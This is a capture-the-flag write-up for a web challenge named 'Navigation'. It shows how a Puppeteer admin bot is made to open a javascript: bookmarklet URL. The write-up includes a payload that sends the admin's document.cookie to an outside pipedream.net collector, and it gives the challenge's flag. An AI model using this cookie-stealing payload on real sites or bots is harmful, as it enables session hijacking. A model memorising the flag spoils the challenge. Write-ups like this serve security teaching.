# Navigation

## Write-up

When you enter the web app, you will get a form with a input asking you to submit a url.

The given url will be captured in the `/go_somewhere` route:

```js
const path = req.body.path;
if(typeof path !== "string") return res.status(400).send("No path provided");
```

The url will be used from `puppeteer` admin boot, which have an admin cookie (that will get on the first goto to localhost), to go to that path:

```js
await page.goto(`http://localhost:3000/?admin=${adminPassword}`);
await page.waitForNavigation({
    waitUntil: 'networkidle0',
});

await page.goto(path);
await browser.close();
```

From there, you will need to know `javascript bookmarklets`:

> Bookmarklets are browser bookmarks that execute JavaScript instead of opening a webpage.

So, in the url part, give it a javascript that recover cookies of the page (admin cookies):

```js
javascript:fetch('https://ennlaozm0ind.x.pipedream.net/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:document.cookie})})
```

Finally, using the cookie collected, go to `/flag` and recover the flag.

## Flag

`shellmates{dONT_LET_PEOpl3_G0_wh3R3_you_DOnt_wAnT_tH3m_t0_6tb23c}`

## More Information

- https://www.freecodecamp.org/news/what-are-bookmarklets/
